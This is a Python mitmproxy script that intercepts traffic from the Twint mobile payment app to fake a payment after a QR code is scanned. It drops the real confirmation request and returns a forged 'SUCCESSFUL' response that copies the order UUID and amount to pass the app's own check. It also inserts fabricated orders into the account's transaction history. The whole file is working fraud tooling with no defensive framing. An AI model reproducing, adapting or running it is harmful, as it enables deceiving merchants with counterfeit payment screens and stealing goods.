"""
Fake the payment confirmation after scanning a Twint QR code

$ mitmdump -p 9090 -s payment_interceptor.py
"""

from mitmproxy import http
from mitmproxy import ctx
import json
import datetime
import uuid

# qr payment merchant meta information
global_merchantUUID = ''
global_merchantLogoUUID = ''
global_merchantName = ''
global_branchName = ''
global_financialAccountId = ''

# global orders history
global_fake_orders = []

# templates
response_template = '{"paymentConfirmation":{"uuid":"9fc4e990-656e-479d-a416-23ef7167f5ef","remainingAmount":0.00,"remainingAmountCurrency":"CHF","confirmedAmount":0.05,"confirmedAmountCurrency":"CHF","isPartial":false},"paymentDetails":{"startingOrigin":"SMALL_BUSINESS_SOLUTION","couponsToBeRedeemed":[],"couponsPossible":true,"pairingUuid":"005d7374-02ef-4a85-9588-c66e70538150","orderUuid":"9fc4e990-656e-479d-a416-23ef7167f5ef","status":"SUCCESSFUL","amount":0.05,"currency":"CHF","availableAmount":0.05,"availableAmountCurrency":"CHF","paymentPossible":"FULL","pinlessPaymentAllowed":false,"confirmationNeeded":true,"token":"30117","merchantUuid":"33e360a3-65c3-4205-9d2d-553d249ea1fe","merchantName":"Jans Shop","merchantLogoUuid":"dd09bd93-9da6-4f20-890e-34b15ace443a","orderType":"PAYMENT","merchantConfirmation":false,"terminalExtId":"096514f9-5094-4fa3-b462-f288dbc30a2b","branchName":"Test Shop, Zuerich","shouldRedirectToReceiptUrl":false,"paymentAuthorizationType":"FINAL_AUTH"}}'

def response(flow: http.HTTPFlow) -> None:
    # preserve the merchant metdata which is later shown in the confirmation view
    if "smartphone/service/v28/qrCodes" in flow.request.pretty_url: 
        if flow.response.content:
            try:
                response_data = json.loads(flow.response.content)
                global global_merchantUUID
                global_merchantUUID = response_data['initiatePayment']['merchantUuid']

                global global_merchantLogoUUID
                global_merchantLogoUUID = response_data['initiatePayment']['merchantLogoUuid']
                
                global global_merchantName
                global_merchantName = response_data['initiatePayment']['merchantName']

                global global_branchName
                global_branchName = response_data['initiatePayment']['branchName']

                ctx.log.info("Updated merchant information: " + global_merchantName)
            except Exception as e:
                ctx.log.error("Failed updating merchant information:" + str(e))

    # intercept the orders and merge them with the global orders to fake the account orders history
    if  "/smartphone/service/v28/orders" in flow.request.pretty_url:
        if flow.response.content:
            try:
                response_data = json.loads(flow.response.content)
                merged_oders = global_fake_orders + response_data['entries']
                sorted_orders =  sorted(merged_oders, key=lambda order: datetime.datetime.strptime(order['ctlModTs'], "%Y-%m-%dT%H:%M:%S.%f%z"), reverse=True)
                response_data['entries'] = sorted_orders
                flow.response.content = json.dumps(response_data, ensure_ascii=False).encode()
                ctx.log.info("Updated orders history")
            except Exception as e:
                ctx.log.error("Failed updating orders history" + str(e))

def request(flow: http.HTTPFlow) -> None:
    # intercept the payment confirmation, drop the original request and return a faked response
    if "/payments/confirmation" in flow.request.pretty_url:
        if flow.request.content:
            try:
                request_data = json.loads(flow.request.content)
                original_amount = request_data['amount']['amount']
                
                # set financial account id for fake order history
                global global_financialAccountId
                global_financialAccountId  = request_data['financialAccountId']

                orderUuid = request_data['orderUuid']
                response_data = json.loads(response_template)
                # update order uuid to prevent in app check which fails the transaction if not matching
                response_data['paymentConfirmation']['uuid'] = orderUuid
                response_data['paymentDetails']['orderUuid'] = orderUuid
                # copy correct amount
                response_data['paymentConfirmation']['confirmedAmount'] = original_amount
                response_data['paymentDetails']['amount'] = original_amount
                response_data['paymentDetails']['availableAmount'] = original_amount
                # set correct merchant info
                response_data['paymentDetails']['merchantUuid'] = global_merchantUUID
                response_data['paymentDetails']['merchantLogoUuid'] = global_merchantLogoUUID
                response_data['paymentDetails']['merchantName'] = global_merchantName
                response_data['paymentDetails']['branchName'] = global_branchName
                
                # send fake response
                flow.response = http.Response.make(
                    200,
                    json.dumps(response_data),
                    {"Content-Type": "application/json"},
                )

                # add order to history
                fake_time = datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z")
                fake_order = {
                    'ctlModTs': fake_time,
                    'ctlCreTs': fake_time,
                    'orderUuid': orderUuid,
                    'sndPhaseTs': fake_time,
                    'requestedAmount': original_amount,
                    'authorizedAmount': original_amount,
                    'paidAmount': original_amount,
                    'discount':0,
                    'currency':'CHF',
                    'merchantName':global_merchantName,
                    'merchantBranchName':global_branchName,
                    'merchantLogoUuid':global_merchantLogoUUID,
                    'merchantConfirmation': str(uuid.uuid4()),
                    'orderType':'PAYMENT',
                    'orderState':'SUCCESSFUL',
                    'transactionSide':'DEBIT',
                    'voucherType':'NONE',
                    'paymentAuthorizationType':'FINAL_AUTH',
                    'financialAccountId':global_financialAccountId
                }
                #global global_fake_orders
                global_fake_orders.append(fake_order)

                ctx.log.info("Faked payment (and updated fake order history len ("+str(len(global_fake_orders))+")) with amount: " + str(original_amount))
            except Exception as e:
                ctx.log.error("Failed fake payment: " + str(e))           